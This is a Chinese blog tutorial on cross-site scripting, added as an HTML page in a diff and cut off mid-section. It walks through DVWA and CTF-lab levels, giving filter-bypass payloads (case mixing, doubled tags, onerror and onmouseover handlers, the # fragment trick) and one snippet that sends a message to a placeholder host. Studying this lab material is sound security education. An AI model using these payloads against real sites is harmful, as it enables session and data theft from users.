@@ -1,0 +1,294 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+      <meta http-equiv="X-UA-Compatible" content="IE=edge">
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+      <!-- Enable responsiveness on mobile devices-->
+      <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+
+      <title>Baz&#x27;s blog</title>
+
+      
+        <link rel="alternate" type="application/atom+xml" title="RSS" href="https://baz.ee/atom.xml">
+      
+
+      
+          <link rel="stylesheet" href="https://baz.ee/site.css">
+      
+
+      
+      
+    </head>
+
+    <body class="hack dark main container">
+        
+    
+        
+                
+                    <header>
+                        <nav itemscope itemtype="http://schema.org/SiteNavigationElement">
+                        
+                            <a itemprop="url"
+                               class=""
+                               href="https:&#x2F;&#x2F;baz.ee">
+                                <span itemprop="name">Home
+                                </span></a>
+                        
+                            <a itemprop="url"
+                               class=""
+                               href="https:&#x2F;&#x2F;baz.ee&#x2F;categories">
+                                <span itemprop="name">Categories
+                                </span></a>
+                        
+                            <a itemprop="url"
+                               class=""
+                               href="https:&#x2F;&#x2F;baz.ee&#x2F;tags">
+                                <span itemprop="name">Tags
+                                </span></a>
+                        
+                        </nav>
+                    </header>
+                
+            
+    
+
+<article itemscope itemtype="http://schema.org/BlogPosting">
+    <header>
+        <h1 itemprop="headline">XSS注入</h1>
+        <span class="muted">
+    <svg style="margin-bottom:-3px" class="i-clock" viewBox="0 0 32 32"
+         width="16" height="16" fill="none" stroke="currentcolor"
+         stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
+        <circle cx="16" cy="16" r="14"/>
+        <path d="M16 8 L16 16 20 20"/>
+    </svg>
+    <span>51 minute read</span>
+    <svg style="margin-bottom: -3px" class="i-edit" viewBox="0 0 32 32"
+         width="16" height="16" fill="none" stroke="currentcolor"
+         stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
+        <path d="M30 7 L25 2 5 22 3 29 10 27 Z M21 6 L26 11 Z M5 22 L10 27 Z"/>
+    </svg>
+
+    Published: 2021-06-12
+</span>
+    </header>
+    <div itemprop="articleBody">
+      <h1 id="xsskua-zhan-jiao-ben-gong-ji-ding-yi">XSS跨站脚本攻击定义</h1>
+<p>跨站脚本攻击（Cross Site scripting）是指攻击者利用网站程序对用户<strong>输入过滤不足</strong>，输入可以显示在页面上对其他用户造成影响的HTML和javascript代码，从而<strong>盗取用户资料</strong>、利用某种身份进行某种动作或者对访问者<strong>进行病毒侵害</strong></p>
+<span id="continue-reading"></span>
+<p>的一种攻击方式。<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1623586047182-4b1866b4-d0e2-425a-9b26-952d134e8290.png#align=left&amp;display=inline&amp;height=158&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-13%20%E4%B8%8B%E5%8D%888.07.15.png&amp;originHeight=158&amp;originWidth=730&amp;size=31885&amp;status=done&amp;style=none&amp;width=730" alt="截屏2021-06-13 下午8.07.15.png" /><br />如上代码的主要作用是获取用户输入的参数作为用户名，并在页面中显示“welcome,XXX”的形式。<br />若在URL后输入 ?name=baz 则页面返回 welcome,baz! 若输入 ?name=<script>alert(/hack by baz/)<script> 则会弹窗 hack by baz 。</p>
+<h1 id="xsslou-dong-fen-lei">XSS漏洞分类</h1>
+<ul>
+<li>反射型XSS
+<ul>
+<li>反射型XSS只是简单地将用户输入的数据直接或未经完善的安全过滤就在浏览器中进行输出，导致输出的数据中存在可被浏览器执行的代码数据。由于此种类型的跨站代码存在于URL中，所以黑客通常需要通过诱骗或加密变形等方式将存在恶意代码的链接发给用户，只有用户点击以后才能使得攻击成功实施。</li>
+<li>嵌入iframe（点击劫持、钓鱼等）</li>
+</ul>
+</li>
+<li>存储型XSS
+<ul>
+<li>存储型XSS脚本攻击是指由于web应用程序对用户输入数据过滤的不严格，导致web应用程序将黑客输入恶意跨站攻击数据信息保存在服务端的数据库或其他文件形式中，当网页进行数据查询展示时，会从数据库中获取数据内容，并将数据内容在网页中进行显示，进而导致跨站脚本代码的执行。</li>
+<li>存储型XSS脚本攻击最为常见的场景就是在留言板、博客或新闻发布系统中，恶意代码的数据信息直接写入文章、评论、留言中，浏览时会执行相应的脚本代码。</li>
+</ul>
+</li>
+<li>DOM型XSS
+<ul>
+<li>基于DOM的XSS跨站脚本攻击是通过修改页面的DOM节点数据信息而形成的XSS跨站脚本攻击。不同于反射型XSS和存储型XSS，基于DOM的XSS跨站脚本攻击往往需要针对具体的JavaScript DOM代码进行分析，并根据实际情况进行XSS跨站脚本攻击的利用。</li>
+</ul>
+</li>
+</ul>
+<h1 id="xssgong-ji-fang-shi">XSS攻击方式</h1>
+<ul>
+<li>XSS盗取用户信息</li>
+<li>XSS盗取cookie</li>
+<li>XSS钓鱼攻击</li>
+<li>XSS蠕虫攻击</li>
+</ul>
+<h2 id="liu-lan-qi-de-tong-yuan-ce-lue">浏览器的同源策略</h2>
+<ul>
+<li>相同协议</li>
+<li>相同域名</li>
+<li>相同端口</li>
+</ul>
+<h2 id="kua-yu-ti-jiao">跨域提交</h2>
+<ul>
+<li>img=new Image();</li>
+<li>img.src=&quot;http://www.xxx.com/get.asp?message=&quot;+msg</li>
+</ul>
+<h2 id="ru-he-you-pian-dui-fang">如何诱骗对方</h2>
+<ul>
+<li>URL变形</li>
+<li>短链接变形</li>
+<li>隐藏在其他页面中</li>
+<li>……</li>
+</ul>
+<h2 id="xssruan-chong-gong-ji">XSS蠕虫攻击</h2>
+<p>XSS蠕虫的破坏力和影响力都是巨大的。XSS蠕虫主要发生在用户之间存在交互行为的页面中，当web应用程序对用户输入的数据信息没有做严格的过滤时，通过结合Ajax的异步提交，就可以实现在植入恶意代码的同时，将恶意代码进行对外发送，即实现代码的感染和传播，也就形成了XSS蠕虫。</p>
+<h1 id="dvwazhong-de-xss">DVWA中的XSS</h1>
+<h2 id="fan-she-xing-xss">反射型XSS</h2>
+<h3 id="low">LOW</h3>
+<p>服务器端核心代码<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1623599019963-d3f1d0b5-1745-4ce6-a622-c5f7b147bca4.png#align=left&amp;display=inline&amp;height=604&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-13%20%E4%B8%8B%E5%8D%8811.43.16.png&amp;originHeight=604&amp;originWidth=1892&amp;size=78161&amp;status=done&amp;style=none&amp;width=1892" alt="截屏2021-06-13 下午11.43.16.png" /><br />可以看到，代码直接引用了name参数，并没有任何的过滤与检查，存在明显的XSS漏洞。<br />漏洞利用<br />输入**<script>alert(/xss/)</script>**，成功弹框：<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1623599187879-bc097765-291c-4861-bf77-09efa2e73350.png#align=left&amp;display=inline&amp;height=269&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=269&amp;originWidth=592&amp;size=30083&amp;status=done&amp;style=none&amp;width=592" alt="image.png" /><br />相应的XSS链接：<br /><a href="http://192.168.153.130/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert(/xss/)%3C%2Fscript%3E#">http://192.168.153.130/dvwa/vulnerabilities/xss_r/?name=<strong>%3Cscript%3Ealert(/xss/)%3C%2Fscript%3E#</strong></a></p>
+<h3 id="medium">MEDIUM</h3>
+<p>服务器端核心代码<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1623599299187-2d9ca7db-ffcb-430e-a1ec-1c77d5515e87.png#align=left&amp;display=inline&amp;height=428&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-13%20%E4%B8%8B%E5%8D%8811.48.06.png&amp;originHeight=428&amp;originWidth=1392&amp;size=207239&amp;status=done&amp;style=none&amp;width=1392" alt="截屏2021-06-13 下午11.48.06.png" /><br />可以看到，这里对输入进行了过滤，基于黑名单的思想，使用str_replace函数将输入中的<script>删除，这种防护机制是可以被轻松绕过的。<br />漏洞利用</p>
+<ol>
+<li>双写绕过</li>
+</ol>
+<p>输入**&lt;sc<script>ript&gt;alert(/xss/)</script>**，成功弹框：<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1623599411714-03f6259b-3970-460d-a4df-0b8627e2784b.png#align=left&amp;display=inline&amp;height=318&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=318&amp;originWidth=550&amp;size=84653&amp;status=done&amp;style=none&amp;width=550" alt="image.png" /><br />相应的XSS链接<br /><a href="http://192.168.153.130/dvwa/vulnerabilities/xss_r/?name=%3Csc%3Cscript%3Eript%3Ealert%28%2Fxss%2F%29%3C%2Fscript%3E#">http://192.168.153.130/dvwa/vulnerabilities/xss_r/?name=<strong>%3Csc%3Cscript%3Eript%3Ealert%28%2Fxss%2F%29%3C%2Fscript%3E#</strong></a></p>
+<ol start="2">
+<li>大小写混淆绕过</li>
+</ol>
+<p>输入**<ScRipt>alert(/xss/)</script>**，成功弹框：<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1623599490807-27d3fbff-4e30-48a1-9c57-e1c94bd915f8.png#align=left&amp;display=inline&amp;height=266&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=266&amp;originWidth=598&amp;size=80476&amp;status=done&amp;style=none&amp;width=598" alt="image.png" /><br />相应的XSS链接：<br /><a href="http://192.168.153.130/dvwa/vulnerabilities/xss_r/?name=%3CScRipt%3Ealert(%2Fxss%2F)%3C%2Fscript%3E">http://192.168.153.130/dvwa/vulnerabilities/xss_r/?name=<strong>%3CScRipt%3Ealert(%2Fxss%2F)%3C%2Fscript%3E</strong></a></p>
+<h3 id="high">HIGH</h3>
+<p>服务器端核心代码<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1623599937932-d04cf5a0-8172-4e76-8fa6-0ecb411835d1.png#align=left&amp;display=inline&amp;height=430&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-13%20%E4%B8%8B%E5%8D%8811.58.17.png&amp;originHeight=430&amp;originWidth=1896&amp;size=89159&amp;status=done&amp;style=none&amp;width=1896" alt="截屏2021-06-13 下午11.58.17.png" /><br />可以看到，High级别的代码同样使用黑名单过滤输入，preg_replace()函数用于正则表达式的搜索和替换，这使得双写绕过、大小写混淆绕过（正则表达式中i表示不区分大小写）不再有效。<br />漏洞利用<br />虽然无法使用<script>标签注入XSS代码，但是可以通过img、body等标签的事件或者iframe等标签的src注入恶意的js代码。<br />输入**&lt;img src=1 οnerrοr=alert(/xss/)&gt;**，成功弹框：<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1623599643996-1d9db84d-8278-4721-bcc4-b3c93e71aa60.png#align=left&amp;display=inline&amp;height=243&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=243&amp;originWidth=564&amp;size=85567&amp;status=done&amp;style=none&amp;width=564" alt="image.png" /><br />相应的XSS链接：<br /><a href="http://192.168.153.130/dvwa/vulnerabilities/xss_r/?name=%3Cimg+src%3D1+onerror%3Dalert%28%2Fxss%2F%29%3E#">http://192.168.153.130/dvwa/vulnerabilities/xss_r/?name=<strong>%3Cimg+src%3D1+onerror%3Dalert%28%2Fxss%2F%29%3E#</strong></a></p>
+<h3 id="impossible">IMPOSSIBLE</h3>
+<p>服务器端核心代码<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1623599961209-5bdc5a3d-4f7e-466a-ac1e-47d3dc00cb2d.png#align=left&amp;display=inline&amp;height=604&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-13%20%E4%B8%8B%E5%8D%8811.58.33.png&amp;originHeight=604&amp;originWidth=1894&amp;size=134663&amp;status=done&amp;style=none&amp;width=1894" alt="截屏2021-06-13 下午11.58.33.png" /><br />可以看到，Impossible级别的代码使用htmlspecialchars函数把预定义的字符&amp;、”、 ’、&lt;、&gt;转换为HTML实体，防止浏览器将其作为HTML元素。</p>
+<h2 id="cun-chu-xing-xss">存储型XSS</h2>
+<p>下面对四种级别的代码进行分析。</p>
+<h3 id="low-1">LOW</h3>
+<p>服务器端核心代码<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1623600004510-644bdf93-d552-48ef-883a-31d8d32fe0b2.png#align=left&amp;display=inline&amp;height=738&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-13%20%E4%B8%8B%E5%8D%8811.59.44.png&amp;originHeight=738&amp;originWidth=1892&amp;size=172936&amp;status=done&amp;style=none&amp;width=1892" alt="截屏2021-06-13 下午11.59.44.png" /><br />相关函数介绍<br />trim(string,charlist)<br />函数移除字符串两侧的空白字符或其他预定义字符，预定义字符包括、\t、\n、\x0B、\r以及空格，可选参数charlist支持添加额外需要删除的字符。<br />mysql_real_escape_string(string,connection)<br />函数会对字符串中的特殊符号（\x00，\n，\r，\，‘，“，\x1a）进行转义。<br />stripslashes(string)<br />函数删除字符串中的反斜杠。<br />可以看到，对输入并没有做XSS方面的过滤与检查，且存储在数据库中，因此这里存在明显的存储型XSS漏洞。<br />漏洞利用<br />message一栏输入**<script>alert(/xss/)</script><strong>，成功弹框：<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1623600139389-a7c854c0-d296-4b3f-911a-5549b1fbf2e3.png#align=left&amp;display=inline&amp;height=275&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=275&amp;originWidth=647&amp;size=99380&amp;status=done&amp;style=none&amp;width=647" alt="image.png" /><br />name一栏前端有字数限制，抓包改为</strong><script>alert(/name/)</script>**：<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1623600182635-4cdec2ad-5f5c-49b4-85d2-da288762715c.png#align=left&amp;display=inline&amp;height=291&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=291&amp;originWidth=533&amp;size=47105&amp;status=done&amp;style=none&amp;width=533" alt="image.png" /><br />成功弹窗<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1623600234034-6f3c149f-2f2b-4972-a77a-ce07f07a0f47.png#align=left&amp;display=inline&amp;height=231&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=231&amp;originWidth=593&amp;size=80595&amp;status=done&amp;style=none&amp;width=593" alt="image.png" /></p>
+<h3 id="medium-1">MEDIUM</h3>
+<p>服务器端核心代码<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1623653413257-0b6c4239-63ce-4476-9729-70a6dcc8a5e2.png#align=left&amp;display=inline&amp;height=824&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-14%20%E4%B8%8B%E5%8D%882.49.45.png&amp;originHeight=824&amp;originWidth=1674&amp;size=197250&amp;status=done&amp;style=none&amp;width=1674" alt="截屏2021-06-14 下午2.49.45.png" /><br />相关函数说明<br />strip_tags() 函数剥去字符串中的HTML、XML以及PHP的标签，但允许使用<b>标签。<br />addslashes() 函数返回在预定义字符（单引号、双引号、反斜杠、NULL）之前添加反斜杠的字符串。<br />可以看到，由于对message参数使用了htmlspecialchars函数进行编码，因此无法再通过message参数注入XSS代码，但是对于name参数，只是简单过滤了<script>字符串，仍然存在存储型的XSS。<br />漏洞利用</p>
+<ol>
+<li>双写绕过</li>
+</ol>
+<p>抓包改name参数为**&lt;sc<script>ript&gt;alert(/xss/)</script>**:<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1623653632426-c9f4bd23-b53f-4614-8529-74546fcd5107.png#align=left&amp;display=inline&amp;height=302&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=302&amp;originWidth=519&amp;size=49000&amp;status=done&amp;style=none&amp;width=519" alt="image.png" /><br />成功弹框：<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1623653659823-6b97c34d-ae6d-4589-b74b-ec029a06c6e7.png#align=left&amp;display=inline&amp;height=222&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=222&amp;originWidth=358&amp;size=44187&amp;status=done&amp;style=none&amp;width=358" alt="image.png" /></p>
+<ol start="2">
+<li>大小写混淆绕过</li>
+</ol>
+<p>抓包改name参数为**<Script>alert(/xss/)</script>:**<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1623653722480-0c75ca11-563c-46c1-b573-a639878faef2.png#align=left&amp;display=inline&amp;height=286&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=286&amp;originWidth=529&amp;size=47806&amp;status=done&amp;style=none&amp;width=529" alt="image.png" /><br />成功弹框：<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1623653752113-0c989b72-264f-4b4f-ab46-cf00441d0ab3.png#align=left&amp;display=inline&amp;height=277&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=277&amp;originWidth=516&amp;size=85120&amp;status=done&amp;style=none&amp;width=516" alt="image.png" /></p>
+<h3 id="high-1">HIGH</h3>
+<p>服务器端核心代码<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1623653842808-c8a38a7d-6f6a-41b1-beb3-682f8ef1b962.png#align=left&amp;display=inline&amp;height=824&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-14%20%E4%B8%8B%E5%8D%882.57.08.png&amp;originHeight=824&amp;originWidth=1672&amp;size=198902&amp;status=done&amp;style=none&amp;width=1672" alt="截屏2021-06-14 下午2.57.08.png" /><br />可以看到，这里使用正则表达式过滤了<script>标签，但是却忽略了img、iframe等其它危险的标签，因此name参数依旧存在存储型XSS。<br />漏洞利用<br />抓包改name参数为**&lt;img src=1 οnerrοr=alert(1)&gt;**：<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1623653908920-58b00ed4-0aa9-4453-b1a5-55ecc1d353c6.png#align=left&amp;display=inline&amp;height=302&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=302&amp;originWidth=530&amp;size=47279&amp;status=done&amp;style=none&amp;width=530" alt="image.png" /><br />成功弹框：<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1623653951366-31649748-011e-4869-8a21-66105c65c73b.png#align=left&amp;display=inline&amp;height=238&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=238&amp;originWidth=458&amp;size=63263&amp;status=done&amp;style=none&amp;width=458" alt="image.png" /></p>
+<h3 id="impossible-1">IMPOSSIBLE</h3>
+<p>服务器端核心代码<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1623654061504-33c98e9c-a149-4e2c-a20f-8c6f50450b53.png#align=left&amp;display=inline&amp;height=1088&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-14%20%E4%B8%8B%E5%8D%883.00.45.png&amp;originHeight=1088&amp;originWidth=1892&amp;size=276316&amp;status=done&amp;style=none&amp;width=1892" alt="截屏2021-06-14 下午3.00.45.png" /><br />可以看到，通过使用htmlspecialchars函数，解决了XSS，但是要注意的是，如果htmlspecialchars函数使用不当，攻击者就可以通过编码的方式绕过函数进行XSS注入，尤其是DOM型的XSS。</p>
+<h2 id="domxing-xss">DOM型XSS</h2>
+<h3 id="low-2">LOW</h3>
+<p>服务器端核心代码<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1623853486858-4166d37a-e95d-4881-a077-f0f8dee92dfa.png#align=left&amp;display=inline&amp;height=848&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-16%20%E4%B8%8B%E5%8D%8810.24.12.png&amp;originHeight=848&amp;originWidth=1736&amp;size=207130&amp;status=done&amp;style=none&amp;width=1736" alt="截屏2021-06-16 下午10.24.12.png" /><br />漏洞利用<br />没有任何过滤，直接输入<br /><a href="http://127.0.0.1:8081/vulnerabilities/xss_d/?default=%3Cscript%3Ealert()%3C/script%3E">http://127.0.0.1:8081/vulnerabilities/xss_d/?default=<strong>%3Cscript%3Ealert()%3C/script%3E</strong></a><br />即可</p>
+<h3 id="medium-2">MEDIUM</h3>
+<p>服务器端核心代码<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1623853779516-7e9b6eb1-0bb8-4721-936d-2abc86f6b2fe.png#align=left&amp;display=inline&amp;height=848&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-16%20%E4%B8%8B%E5%8D%8810.29.26.png&amp;originHeight=848&amp;originWidth=1736&amp;size=259864&amp;status=done&amp;style=none&amp;width=1736" alt="截屏2021-06-16 下午10.29.26.png" /><br />关于stripos<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1623853965662-29999732-c1c8-4ff5-9f3a-4e3e1bf48078.png#align=left&amp;display=inline&amp;height=310&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-16%20%E4%B8%8B%E5%8D%8810.32.13.png&amp;originHeight=876&amp;originWidth=1050&amp;size=108350&amp;status=done&amp;style=none&amp;width=372" alt="截屏2021-06-16 下午10.32.13.png" /><br />所以这里不允许出现&lt;script的大小写形式<br />漏洞利用<br />观察网页源代码<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2424924/1623854179056-065682aa-74e1-4108-b7fb-1dbfa196caf5.png#align=left&amp;display=inline&amp;height=1662&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-16%20%E4%B8%8B%E5%8D%8810.35.51.png&amp;originHeight=1662&amp;originWidth=2604&amp;size=731671&amp;status=done&amp;style=none&amp;width=2604" alt="截屏2021-06-16 下午10.35.51.png" /><br />这里有两种绕过方式</p>
+<ol>
+<li>使用#绕过</li>
+</ol>
+<p>字符#后的数据不会发送到服务器端，从而绕过服务端过滤<br /><strong>?default=#%3Cscript%3Ealert(1)%3C/script%3E</strong></p>
+<ol start="2">
+<li>使用img标签</li>
+</ol>
+</option > </select>将之前的标签闭合，图片加载错误则执行alert<br />**?default=</option></select><img src=# onerror=alert("xss")>**
+### HIGH
+服务端核心代码<br />![截屏2021-06-16 下午10.46.05.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623854782523-73d005f8-9737-44cf-a733-a30909b42023.png#align=left&display=inline&height=848&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-16%20%E4%B8%8B%E5%8D%8810.46.05.png&originHeight=848&originWidth=1736&size=262663&status=done&style=none&width=1736)<br />漏洞利用<br />这里限制了输入内容种类，可以继续用#绕过<br />**?default=English#%3Cscript%3Ealert(1)%3C/script%3E**
+### IMPOSSIBLE
+后台核心代码<br />![截屏2021-06-16 下午10.53.43.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623855235963-2366ee91-cac6-4214-9364-2b98606a02b8.png#align=left&display=inline&height=848&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-16%20%E4%B8%8B%E5%8D%8810.53.43.png&originHeight=848&originWidth=1736&size=213874&status=done&style=none&width=1736)<br />没什么可做的
+# XSS的绕过方式
+网址：[http://test.ctf8.com/](http://test.ctf8.com/)<br />![截屏2021-06-14 下午11.22.26.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623684163081-1bbe170b-f41f-4713-9c7d-aa642b75b719.png#align=left&display=inline&height=1662&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-14%20%E4%B8%8B%E5%8D%8811.22.26.png&originHeight=1662&originWidth=2604&size=594096&status=done&style=none&width=2604)
+## 直接注入
+![截屏2021-06-14 下午11.34.05.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623684889704-1480da6d-d476-4707-9f38-4fb28f1d333d.png#align=left&display=inline&height=1662&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-14%20%E4%B8%8B%E5%8D%8811.34.05.png&originHeight=1662&originWidth=2604&size=640635&status=done&style=none&width=2604)<br />直接输入 **<script>alert()</script>** 即可<br />后台源码<br />![截屏2021-06-14 下午11.37.45.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623685076023-01d6e487-6b0f-4d17-8eef-505a14da8938.png#align=left&display=inline&height=1182&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-14%20%E4%B8%8B%E5%8D%8811.37.45.png&originHeight=1182&originWidth=1704&size=224969&status=done&style=none&width=1704)
+## htmlspecialchars过滤 < 和 >（事件绕过）
+![截屏2021-06-14 下午11.45.41.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623685555267-c1c9404d-4165-4206-93ba-3ad7f4178234.png#align=left&display=inline&height=1662&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-14%20%E4%B8%8B%E5%8D%8811.45.41.png&originHeight=1662&originWidth=2604&size=481578&status=done&style=none&width=2604)<br />这里不能使用 < 和 > ,查看网页源码<br />![截屏2021-06-14 下午11.52.44.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623685981940-eda15a49-324d-42f9-b0cc-a816f85f2f13.png#align=left&display=inline&height=1662&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-14%20%E4%B8%8B%E5%8D%8811.52.44.png&originHeight=1662&originWidth=2604&size=727062&status=done&style=none&width=2604)<br />value属性的值可以随意更改<br />先用 " 闭合前面的value，后面写上我们自己的属性即可<br />输入<br />** " onmouseover=alert(1)> "**<br />或者<br />** " onclick=alert(1) "**<br />**![截屏2021-06-14 下午11.56.51.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623686230518-89d75cde-0e4d-4850-a59e-a8fdc8f242df.png#align=left&display=inline&height=1662&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-14%20%E4%B8%8B%E5%8D%8811.56.51.png&originHeight=1662&originWidth=2604&size=736120&status=done&style=none&width=2604)**<br />后台源码<br />![截屏2021-06-14 下午11.58.40.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623686394741-0f048c28-d1c6-44e7-852c-c1f50537b106.png#align=left&display=inline&height=1358&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-14%20%E4%B8%8B%E5%8D%8811.58.40.png&originHeight=1358&originWidth=1924&size=293786&status=done&style=none&width=1924)<br />可以看到 PHP htmlspecialchars() 函数对输入进行了过滤<br />![截屏2021-06-15 上午12.01.40.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623686514978-9eac38b7-30d9-4bdf-a951-42037868e03d.png#align=left&display=inline&height=420&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-15%20%E4%B8%8A%E5%8D%8812.01.40.png&originHeight=420&originWidth=974&size=63667&status=done&style=none&width=974)<br />还有一种方法就是在构造payload时<br />**将input的文本框本分提前闭合**<br />输入<br />** "><script>alert(1)</script>**<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623686823778-5340c221-f663-4dd5-8177-d1de37e009f5.png#align=left&display=inline&height=1080&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1080&originWidth=1919&size=220258&status=done&style=none&width=1919)
+## 属性值单双引号包裹
+![截屏2021-06-15 上午12.14.33.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623687285290-32c1f9cf-6fac-497a-b5c0-c4ad96b7581a.png#align=left&display=inline&height=1662&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-15%20%E4%B8%8A%E5%8D%8812.14.33.png&originHeight=1662&originWidth=2604&size=730277&status=done&style=none&width=2604)<br />本题直接将<和>转义了，彻底不能使用<>，且闭合value要用单引号 '<br />输入<br />  **' onmouseover=alert(1) '**<br />**![截屏2021-06-15 上午12.17.56.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623687503044-698faf0d-b35c-45bb-a921-2a98a9bda086.png#align=left&display=inline&height=1662&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-15%20%E4%B8%8A%E5%8D%8812.17.56.png&originHeight=1662&originWidth=2604&size=740636&status=done&style=none&width=2604)**<br />后台源码<br />![截屏2021-06-15 上午12.19.39.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1623687598230-319519e8-9ec3-40a4-b3ee-7024dc5cba9e.png#align=left&display=inline&height=1402&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-15%20%E4%B8%8A%E5%8D%8812.19.39.png&originHeight=1402&originWidth=1924&size=303865&status=done&style=none&width=1924)<br />与第二关的区别是多了一句<br />value='".htmlspecialchars($str)."'<br />所以我们要将其构造成<br /><input name="keyword" value='"' onmouseover="alert(1)'"'><br />这也是为什么要用单引号 ' 闭合的原因
+## str_replace替换< 和 >（事件绕过）
